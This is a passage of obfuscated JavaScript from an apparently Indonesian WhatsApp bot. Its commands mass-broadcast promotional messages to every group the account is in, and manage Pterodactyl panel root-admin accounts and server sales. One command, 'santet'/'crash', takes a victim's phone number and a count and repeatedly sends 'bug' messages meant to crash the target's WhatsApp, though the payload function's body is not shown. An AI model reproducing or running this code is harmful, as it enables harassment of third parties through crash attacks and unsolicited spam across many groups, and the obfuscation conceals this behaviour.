            text: _0x4fb2f1
          };
          let _0x30c4a1 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x3350ec),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linksaluran + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          for (let _0x460a76 of _0x439cb3) {
            try {
              await _0x59b98d.relayMessage(_0x460a76, _0x30c4a1.message, {
                messageId: _0x30c4a1.key.id
              });
              _0x3245dc += 1;
            } catch {}
            await sleep(4000);
          }
          _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x3245dc + " Grup*");
        }
        break;
      case "jpmhidetag":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f && !_0x16d835.quoted) {
            return _0x16d835.reply(_0x286488("teksnya atau replyteks"));
          }
          var _0x487964 = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
          let _0x30d149 = 0;
          let _0x24c1ed = await _0x59b98d.groupFetchAllParticipating();
          let _0x2022e5 = Object.entries(_0x24c1ed).slice(0).map(_0x50a96c => _0x50a96c[1]);
          let _0x55f3ee = _0x2022e5.filter(_0x33d113 => _0x33d113.announce == false);
          let _0x42c49d = _0x55f3ee.map(_0x58e657 => _0x58e657.id);
          _0x16d835.reply("Memproses Mengirim Pesan *Text* Ke *" + _0x42c49d.length + "* Grup");
          for (let _0x19c9c8 of _0x42c49d) {
            try {
              const _0x133222 = {
                quoted: _0x143656
              };
              await _0x59b98d.sendMessage(_0x19c9c8, {
                text: _0x487964,
                mentions: _0x24c1ed[_0x19c9c8].participants.map(_0x1ecf6e => _0x1ecf6e.id)
              }, _0x133222);
              _0x30d149 += 1;
            } catch (_0x2f38fa) {
              console.log(_0x2f38fa);
            }
            await sleep(global.delayjpm);
          }
          _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x30d149 + " Grup*");
        }
        break;
      case "jpm":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f && !_0x16d835.quoted) {
            return _0x16d835.reply(_0x286488("teksnya atau replyteks"));
          }
          var _0x487964 = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
          let _0x897824 = 0;
          let _0x4b74e8 = await _0x59b98d.groupFetchAllParticipating();
          let _0x27eccc = Object.entries(_0x4b74e8).slice(0).map(_0x5e6d66 => _0x5e6d66[1]);
          let _0x10e6c5 = _0x27eccc.filter(_0x1e736a => _0x1e736a.announce == false);
          let _0x2a4734 = _0x10e6c5.map(_0x1b999a => _0x1b999a.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x2a4734.length + " Grup*");
          for (let _0x419d4d of _0x2a4734) {
            try {
              const _0x2eb348 = {
                text: _0x487964
              };
              const _0x517ef1 = {
                quoted: _0x143656
              };
              await _0x59b98d.sendMessage(_0x419d4d, _0x2eb348, _0x517ef1);
              _0x897824 += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x897824 + " Grup*");
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f && !_0x16d835.quoted) {
            return _0x16d835.reply(_0x286488("teksnya atau replyteks"));
          }
          var _0x487964 = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
          let _0x204fb1 = 0;
          let _0x80ae3 = await _0x59b98d.groupFetchAllParticipating();
          let _0x4ab289 = Object.entries(_0x80ae3).slice(0).map(_0x4ce894 => _0x4ce894[1]);
          let _0x2249ff = _0x4ab289.filter(_0x4a8879 => _0x4a8879.announce == false);
          let _0x230a67 = _0x2249ff.map(_0x544731 => _0x544731.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x230a67.length + " Grup*");
          let _0x5e3b11 = _0x487964;
          const _0x4de34a = {
            text: _0x5e3b11
          };
          let _0x590d54 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x4de34a),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linksaluran + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          for (let _0x1aa49a of _0x230a67) {
            try {
              await _0x59b98d.relayMessage(_0x1aa49a, _0x590d54.message, {
                messageId: _0x590d54.key.id
              });
              _0x204fb1 += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x204fb1 + " Grup*");
        }
        break;
      case "jpm2":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya dengan balas/kirim foto"));
          }
          if (!/image/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("teksnya dengan balas/kirim foto"));
          }
          let _0x2c36d5 = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
          let _0xa2ed8b = 0;
          let _0x3bcc33 = await _0x59b98d.groupFetchAllParticipating();
          let _0x4ccd36 = Object.entries(_0x3bcc33).slice(0).map(_0x1cfcb8 => _0x1cfcb8[1]);
          let _0x43d720 = _0x4ccd36.filter(_0x54f7aa => _0x54f7aa.announce == false);
          let _0x51c956 = _0x43d720.map(_0x1cba05 => _0x1cba05.id);
          _0x16d835.reply("Memproses Mengirim Pesan Teks & Foto Ke *" + _0x51c956.length + " Grup*");
          for (let _0x14b9ca of _0x51c956) {
            try {
              const _0x4d18f0 = {
                quoted: _0x143656
              };
              _0x59b98d.sendMessage(_0x14b9ca, {
                image: await fs.readFileSync(_0x2c36d5),
                caption: _0x43281f,
                contextInfo: {
                  forwardingScore: 1,
                  isForwarded: true
                }
              }, _0x4d18f0);
              _0xa2ed8b += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          await fs.unlinkSync(_0x2c36d5);
          _0x16d835.reply("Berhasil Mengirim Postingan Ke *" + _0xa2ed8b + " Grup*");
        }
        break;
      case "jpmtesti":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya dengan balas/kirim foto"));
          }
          if (!/image/.test(_0x3177c1)) {
            return _0x16d835.reply(_0x286488("teksnya dengan balas/kirim foto"));
          }
          let _0x27eb9b = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
          if (global.idsaluran == "-") {
            return _0x16d835.reply("Isi Dulu ID Saluran Lu Di File Settings.js!");
          }
          let _0x161337 = 0;
          let _0x22a5fc = await _0x59b98d.groupFetchAllParticipating();
          let _0xbbc571 = Object.entries(_0x22a5fc).slice(0).map(_0x5f18a0 => _0x5f18a0[1]);
          let _0xcd987c = _0xbbc571.filter(_0x123db0 => _0x123db0.announce == false);
          let _0x3fad67 = _0xcd987c.map(_0x526585 => _0x526585.id);
          _0x16d835.reply("Memproses Mengirim Pesan Teks & Foto Ke *" + _0x3fad67.length + " Grup*");
          const _0x55d1fb = {
            text: _0x43281f
          };
          const _0x12a4f3 = {
            upload: _0x59b98d.waUploadToServer
          };
          const _0x187e8c = {
            name: "cta_url",
            buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
          };
          const _0x8c5857 = {
            name: "cta_url",
            buttonParamsJson: "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linksaluran + "\",\"merchant_url\":\"https://www.google.com\"}"
          };
          const _0x1d2c71 = {
            buttons: [_0x187e8c, _0x8c5857]
          };
          let _0xb453ad = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x55d1fb),
                  header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                      image: await fs.readFileSync(_0x27eb9b)
                    }, _0x12a4f3))
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create(_0x1d2c71)
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          for (let _0x5bce97 of _0x3fad67) {
            try {
              await _0x59b98d.relayMessage(_0x5bce97, _0xb453ad.message, {
                messageId: _0xb453ad.key.id
              });
              _0x161337 += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          await fs.unlinkSync(_0x27eb9b);
          _0x16d835.reply("Berhasil Mengirim Postingan Ke *" + _0x161337 + " Grup*");
        }
        break;
      case "addadmin":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("username"));
          }
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0x4f901b = _0x43281f.toLowerCase();
          let _0x18d286 = _0x4f901b + "@gmail.com";
          let _0x5b8db0 = _0x2931f6(_0x57e1e7[0]);
          let _0x42c065 = _0x4f901b + crypto.randomBytes(2).toString("hex");
          let _0x2e8b53 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x18d286,
              username: _0x4f901b.toLowerCase(),
              first_name: _0x5b8db0,
              last_name: "Admin",
              root_admin: true,
              language: "en",
              password: _0x42c065.toString()
            })
          });
          let _0x28ae84 = await _0x2e8b53.json();
          if (_0x28ae84.errors) {
            return _0x16d835.reply(JSON.stringify(_0x28ae84.errors[0], null, 2));
          }
          let _0x4b8b17 = _0x28ae84.attributes;
          var _0x21927c;
          if (_0x570995) {
            _0x21927c = _0x16d835.sender;
            await _0x16d835.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat");
          } else {
            _0x21927c = _0x16d835.chat;
          }
          var _0x487964 = "\n*Berhasil Membuat Admin Panel ✅*\n\n* *ID :* " + _0x4b8b17.id + "\n* *Nama :* " + _0x4b8b17.first_name + "\n* *Created :* " + _0x4b8b17.created_at.split("T")[0] + "\n";
          const _0x1e3f3b = {
            text: _0x487964
          };
          const _0x5bba3d = {
            name: "cta_url",
            buttonParamsJson: "{\"display_text\":\"Login Server Panel\",\"url\":\"" + global.domain + "\",\"merchant_url\":\"https://www.google.com\"}"
          };
          let _0x57a7d2 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x1e3f3b),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [_0x5bba3d, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"" + _0x4b8b17.username + "\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"" + _0x42c065.toString() + "\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x21927c, _0x57a7d2.message, {
            messageId: _0x57a7d2.key.id
          });
        }
        break;
      case "addadmin2":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          if (!_0x43281f.split(",")) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x11d2bf = _0x43281f.split(",")[0].toLowerCase();
          if (!_0x11d2bf) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x5026a0 = _0x43281f.split(",")[1];
          if (!_0x5026a0) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x384dcc = _0x43281f.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x2037b3 = await _0x59b98d.onWhatsApp(_0x5026a0);
          if (!_0x2037b3[0].exists) {
            return _0x16d835.reply("Nomor Buyyer Tidak Valid!");
          }
          let _0x5c4f06 = _0x11d2bf.toLowerCase();
          let _0x26d7bc = _0x5c4f06 + "@gmail.com";
          let _0x906213 = _0x2931f6(_0x5c4f06);
          let _0xf1b239 = _0x5c4f06 + crypto.randomBytes(2).toString("hex");
          let _0x198bdf = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x26d7bc,
              username: _0x5c4f06.toLowerCase(),
              first_name: _0x906213,
              last_name: "Admin",
              root_admin: true,
              language: "en",
              password: _0xf1b239.toString()
            })
          });
          let _0x4bbc9a = await _0x198bdf.json();
          if (_0x4bbc9a.errors) {
            return _0x16d835.reply(JSON.stringify(_0x4bbc9a.errors[0], null, 2));
          }
          let _0x307af7 = _0x4bbc9a.attributes;
          await _0x16d835.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor " + _0x5026a0);
          var _0x487964 = "\n*Berhasil Membuat Admin Panel ✅*\n\n* *ID :* " + _0x307af7.id + "\n* *Nama :* " + _0x307af7.first_name + "\n* *Created :* " + _0x307af7.created_at.split("T")[0] + "\n";
          const _0x4cf502 = {
            text: _0x487964
          };
          let _0x3f400d = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x4cf502),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Login Server Panel\",\"url\":\"" + global.domain + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"" + _0x307af7.username + "\"}"
                    }, {
                      name: "cta_copy",
                      buttonParamsJson: "{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"" + _0xf1b239.toString() + "\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x384dcc, _0x3f400d.message, {
            messageId: _0x3f400d.key.id
          });
        }
        break;
      case "deladmin":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("id\n\nuntuk melihat id admin ketik *.listadmin*"));
          }
          let _0x14b566 = await fetch(domain + "/api/application/users?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3053fd = await _0x14b566.json();
          let _0x21245a = _0x3053fd.data;
          let _0xbb63de = null;
          let _0x5bd974 = null;
          await _0x21245a.forEach(async _0x154b21 => {
            if (_0x154b21.attributes.id == _0x57e1e7[0] && _0x154b21.attributes.root_admin == true) {
              _0xbb63de = _0x154b21.attributes.username;
              _0x5bd974 = _0x154b21.attributes.id;
              let _0x44e618 = await fetch(domain + ("/api/application/users/" + _0x5bd974), {
                method: "DELETE",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey
                }
              });
              let _0x2ef7cf = _0x44e618.ok ? {
                errors: null
              } : await _0x44e618.json();
            }
          });
          if (_0x5bd974 == null) {
            return _0x16d835.reply("ID Admin Tidak Ditemukan!");
          }
          _0x16d835.reply("Berhasil Menghapus Admin Panel *" + _0x2931f6(_0xbb63de) + "*");
        }
        break;
      case "listadmin":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0xff5ea6 = await fetch(domain + "/api/application/users?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x2e149d = await _0xff5ea6.json();
          let _0x336cad = _0x2e149d.data;
          let _0x1c7801 = 0;
          if (_0x336cad.length < 1) {
            return _0x16d835.reply("Tidak Ada Admin Panel");
          }
          var _0x487964 = " *LIST ADMIN PANEL BOT⚡*\n\n";
          await _0x336cad.forEach(_0xbf7909 => {
            if (_0xbf7909.attributes.root_admin !== true) {
              return;
            }
            _0x1c7801 += 1;
            _0x487964 += "`📡ID User " + _0xbf7909.attributes.id + "`\n* Nama : *" + _0xbf7909.attributes.first_name + "*\n* Created : " + _0xbf7909.attributes.created_at.split("T")[0] + "\n\n";
          });
          _0x487964 += " Total Admin : *" + _0x1c7801 + " Admin*";
          _0x59b98d.sendText(_0x16d835.chat, _0x487964, _0x1f415b);
        }
        break;
      case "santet":
      case "crash":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("6283XX,jumlahbug"));
          }
          if (!_0x43281f.split(",")) {
            return _0x16d835.reply(_0x286488("6283XX,jumlahbug"));
          }
          var [_0x2bb98e, _0x356a28] = _0x43281f.split(",");
          if (isNaN(_0x2bb98e)) {
            return _0x16d835.reply("Target Tidak Valid!");
          }
          if (isNaN(_0x356a28)) {
            return _0x16d835.reply("Jumlah Tidak Valid!");
          }
          var _0x5e386f = _0x2bb98e.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x2037b3 = await _0x59b98d.onWhatsApp(_0x5e386f.split("@")[0]);
          if (!_0x2037b3[0].exists) {
            return _0x16d835.reply("Target Tidak Terdaftar Di WhatsApp");
          }
          _0x16d835.reply("Memproses Pengiriman Bug . . .");
          var _0xec5b9d = Number(_0x356a28) + 10;
          for (let _0x271a38 = 0; _0x271a38 < _0xec5b9d; _0x271a38++) {
            if (_0x271a38 == 10) {
              _0x16d835.reply("Berhasil Memproses, Bug Sedang Dikirim Ke " + _0x5e386f.split("@")[0]);
            }
            _0x3634cf("" + _0x5e386f);
            await sleep(2000);
          }
        }
        break;
      case "cpanel":
      case "addpanel":
      case "buatpanel":
        {
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x16d835.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("nama"));
          }
          global.panel = [_0x43281f.toLowerCase()];
          let _0x4a8339 = "Silahkan Pilih Ram Server Panel";
          const _0x4e9dfe = {
            text: _0x4a8339
          };
          const _0x1e9f0f = {
            text: global.foother
          };
          let _0x17fc8f = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x4e9dfe),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x1e9f0f),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: "{ \"title\": \"Pilih Ram Panel\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"Ram Unlimited\", \"title\": \"Ram Unlimited | CPU Unlimited\", \"id\": \".cpunli\" }, \n{ \"header\": \"Ram 1GB\", \"title\": \"Ram 1GB | CPU 40%\", \"id\": \".cp1gb\" }, \n{ \"header\": \"Ram 2GB\", \"title\": \"Ram 2GB | CPU 60%\", \"id\": \".cp2gb\" }, \n{ \"header\": \"Ram 3GB\", \"title\": \"Ram 3GB | CPU 80%\", \"id\": \".cp3gb\" }, \n{ \"header\": \"Ram 4GB\", \"title\": \"Ram 4GB | CPU 100%\", \"id\": \".cp4gb\" }, \n{ \"header\": \"Ram 5GB\", \"title\": \"Ram 5GB | CPU 120%\", \"id\": \".cp5gb\" }, \n{ \"header\": \"Ram 6GB\", \"title\": \"Ram 6GB | CPU 140%\", \"id\": \".cp6gb\" }, \n{ \"header\": \"Ram 7GB\", \"title\": \"Ram 7GB | CPU 160%\", \"id\": \".cp7gb\" }, \n{ \"header\": \"Ram 8GB\", \"title\": \"Ram 8GB | CPU 180%\", \"id\": \".cp8gb\" }, \n{ \"header\": \"Ram 9GB\", \"title\": \"Ram 9GB | CPU 200%\", \"id\": \".cp9gb\" }]}]}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x17fc8f.key.remoteJid, _0x17fc8f.message, {
            messageId: _0x17fc8f.key.id
          });
        }
        break;
      case "cpanel2":
      case "addpanel2":
      case "buatpanel2":
        {
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x16d835.reply("Apikey Tidak Ditemukan!");
          }
          global.tempuser = crypto.randomBytes(3).toString("hex");
          global.temppw = crypto.randomBytes(4).toString("hex");
          let _0x4f77e3 = "Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot";
          const _0x1165fd = {
            text: _0x4f77e3
          };
          const _0x26158a = {
            text: global.foother
          };
          const _0x144040 = {
            name: "single_select",
            buttonParamsJson: "{ \"title\": \"Pilih Ram Panel\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"Ram Unlimited\", \"title\": \"Ram Unlimited | CPU Unlimited\", \"id\": \".cpunliv2\" }, \n{ \"header\": \"Ram 1GB\", \"title\": \"Ram 1GB | CPU 40%\", \"id\": \".cp1gbv2\" }, \n{ \"header\": \"Ram 2GB\", \"title\": \"Ram 2GB | CPU 60%\", \"id\": \".cp2gbv2\" }, \n{ \"header\": \"Ram 3GB\", \"title\": \"Ram 3GB | CPU 80%\", \"id\": \".cp3gbv2\" }, \n{ \"header\": \"Ram 4GB\", \"title\": \"Ram 4GB | CPU 100%\", \"id\": \".cp4gbv2\" }, \n{ \"header\": \"Ram 5GB\", \"title\": \"Ram 5GB | CPU 120%\", \"id\": \".cp5gbv2\" }, \n{ \"header\": \"Ram 6GB\", \"title\": \"Ram 6GB | CPU 140%\", \"id\": \".cp6gbv2\" }, \n{ \"header\": \"Ram 7GB\", \"title\": \"Ram 7GB | CPU 160%\", \"id\": \".cp7gbv2\" }, \n{ \"header\": \"Ram 8GB\", \"title\": \"Ram 8GB | CPU 180%\", \"id\": \".cp8gbv2\" }, \n{ \"header\": \"Ram 9GB\", \"title\": \"Ram 9GB | CPU 200%\", \"id\": \".cp9gbv2\" }]}]}"
          };
          const _0x31597b = {
            buttons: [_0x144040]
          };
          let _0x114e1e = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x1165fd),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x26158a),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create(_0x31597b)
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x114e1e.key.remoteJid, _0x114e1e.message, {
            messageId: _0x114e1e.key.id
          });
        }
        break;
      case "cpanel3":
      case "addpanel3":
      case "buatpanel3":
        {
          if (!_0x1d834a && !_0x2aaf9c) {
            return _0x3abc22(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x16d835.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          if (!_0x43281f.split(",")) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x11d2bf = _0x43281f.split(",")[0].toLowerCase();
          if (!_0x11d2bf) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x5026a0 = _0x43281f.split(",")[1];
          if (!_0x5026a0) {
            return _0x16d835.reply(_0x286488("nama,6283XXX"));
          }
          var _0x384dcc = _0x43281f.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x2037b3 = await _0x59b98d.onWhatsApp(_0x5026a0);
          if (!_0x2037b3[0].exists) {
            return _0x16d835.reply("Nomor Buyyer Tidak Valid!");
          }
          global.panel3 = [_0x11d2bf, _0x384dcc];
          let _0x116e9e = "Silahkan Pilih Ram Server Panel";
          const _0x3c0666 = {
            text: _0x116e9e
          };
          const _0x1249d1 = {
            text: global.foother
          };
          let _0x2fa31d = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x3c0666),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x1249d1),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: "{ \"title\": \"Pilih Ram Panel\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"Ram Unlimited\", \"title\": \"Ram Unlimited | CPU Unlimited\", \"id\": \".cpunliv3\" }, \n{ \"header\": \"Ram 1GB\", \"title\": \"Ram 1GB | CPU 40%\", \"id\": \".cp1gbv3\" }, \n{ \"header\": \"Ram 2GB\", \"title\": \"Ram 2GB | CPU 60%\", \"id\": \".cp2gbv3\" }, \n{ \"header\": \"Ram 3GB\", \"title\": \"Ram 3GB | CPU 80%\", \"id\": \".cp3gbv3\" }, \n{ \"header\": \"Ram 4GB\", \"title\": \"Ram 4GB | CPU 100%\", \"id\": \".cp4gbv3\" }, \n{ \"header\": \"Ram 5GB\", \"title\": \"Ram 5GB | CPU 120%\", \"id\": \".cp5gbv3\" }, \n{ \"header\": \"Ram 6GB\", \"title\": \"Ram 6GB | CPU 140%\", \"id\": \".cp6gbv3\" }, \n{ \"header\": \"Ram 7GB\", \"title\": \"Ram 7GB | CPU 160%\", \"id\": \".cp7gbv3\" }, \n{ \"header\": \"Ram 8GB\", \"title\": \"Ram 8GB | CPU 180%\", \"id\": \".cp8gbv3\" }, \n{ \"header\": \"Ram 9GB\", \"title\": \"Ram 9GB | CPU 200%\", \"id\": \".cp9gbv3\" }]}]}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x2fa31d.key.remoteJid, _0x2fa31d.message, {
            messageId: _0x2fa31d.key.id
          });
        }
        break;
      case "cp1gbv2":
      case "cp2gbv2":
      case "cp3gbv2":
      case "cp4gbv2":
      case "cp5gbv2":
      case "cp6gbv2":
      case "cp7gbv2":
      case "cp8gbv2":
